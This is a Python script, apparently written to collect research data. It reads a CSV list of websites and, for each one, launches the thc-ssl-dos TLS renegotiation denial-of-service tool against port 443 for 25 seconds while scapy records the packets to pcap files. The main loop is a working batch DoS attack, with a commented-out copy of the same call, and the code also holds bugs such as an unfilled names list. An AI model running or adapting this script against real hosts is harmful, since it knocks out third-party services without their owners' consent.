import subprocess
import os, signal
import time
import csv
ips=[]
import sys
from scapy.all import *
from threading import Thread, Event
from time import sleep
import traceback
import xlrd
import socket

import datetime
import os
import logging
from fake_useragent import UserAgent
websites=[]
failedNames = []
failedWebsites = []
logging.basicConfig(filename='application.log',level=logging.INFO,format='%(asctime)s-%(levelname)s-%(message)s')
if len(sys.argv) <= 2:
	print("Usage: <repetitions> <sniff-output-prefix>")
	exit(1)

numOfTries = int(sys.argv[1])
outputPrefix = str(sys.argv[2])
retries = 0

class Sniffer(Thread):
	def  __init__(self, host, interface=None):
		super().__init__()

		self.daemon = True

		self.socket = None

		self.filters = "host " + str(host)

		self.interface = interface
		self.stop_sniffer = Event()

	def run(self):
		self.socket = conf.L2listen(
			type=ETH_P_ALL,
			iface=self.interface,
			filter=self.filters
		)

		self.capture = sniff(
			opened_socket=self.socket,
			prn=self.print_packet,
			stop_filter=self.should_stop_sniffer#,
			#store=0
		)

	def join(self, timeout=None):
		self.stop_sniffer.set()
		super().join(timeout)

	def should_stop_sniffer(self, packet):
		return self.stop_sniffer.isSet()

	def print_packet(self, packet):
		ip_layer = packet.getlayer(IP)
		logging.debug("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))

with open("secure_client_renego.csv",'r') as f:
    read = csv.reader(f, dialect= "excel")
    for h in read:
        ip= h[0].split("/")
        print(ip[1])
        websites.append(ip)
#for g in ips:
#   proc= subprocess.Popen("thc-ssl-dos "+g + " 443 --accept", shell=True,preexec_fn=os.setsid)
#    time.sleep(30)
#    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
failedNames = []
failedWebsites = []
failures = 0
names = []
print(type(len(websites)))
i=0
while i < len(websites):
	sniffer = Sniffer(websites[i][1])
	logging.info("Now processing: " + websites[i][0])

	logging.debug("[*] Start sniffing...")
	sniffer.start()

	j = 0
	httpRetries = 0
	timeouts = 0
	try:
		proc = subprocess.Popen("thc-ssl-dos " + websites[i][1] + " 443 --accept", shell=True, preexec_fn=os.setsid)
		time.sleep(25)
		os.killpg(os.getpgid(proc.pid), signal.SIGTERM)


	except Exception as e:
		with open("errors.out", 'a+') as f:
			f.write("===========================================================================================================================\n");
			f.write(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + " - Error accessing website:\n")
			f.write(traceback.format_exc());
			f.write("Website: " + str(websites[i][0]) + "\n");
		logging.warning("Request error for website: " + str(websites[i][0]));
		failedNames.append(names[i])
		failedWebsites.append(websites[i][0])
		i += 1
		continue

	logging.debug("[*] Stop sniffing")
	sniffer.join(5.0)

	if not os.path.exists(outputPrefix):
		os.makedirs(outputPrefix)

	if hasattr(sniffer, 'capture'):
		filename = outputPrefix + websites[i][0] + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
		if j < numOfTries:
			filename = outputPrefix + websites[i][0] + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_" + str(j) + ".pcap"

		wrpcap(filename, sniffer.capture)

		if sniffer.isAlive(): #TODO fix: Note that if it enters the if statement then it will crash in the next step when it attempts to get sniffer.capture.
			sniffer.socket.close()

		i += 1
		retries = 0

		#try:
		#	main(filename, filename)
		#except Exception as e:
		#	with open("errors.out", 'a+') as f:
		#		f.write("===========================================================================================================================\n");
		#		f.write(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + " - Error running prob_matrix:\n")
		#		f.write(traceback.format_exc());
		#		f.write("Website: " + str(websites[i][0]) + "\n");
		#		logging.warning("Request error for prob_matrix: " + str(websites[i][0]));
		#		failedNames.append(names[i])
		#		failedWebsites.append(websites[i][0])
		#		i = i + 1
		#	continue

	else:
		if retries < 0:
			logging.info("Sniffer does not have capture property, retrying...")
			retries += 1
		else:
			logging.warning("Failure: Maximum retries exceeded for website " + str(websites[i][0]) + " Skipping...")
			i += 1
			failures += 1


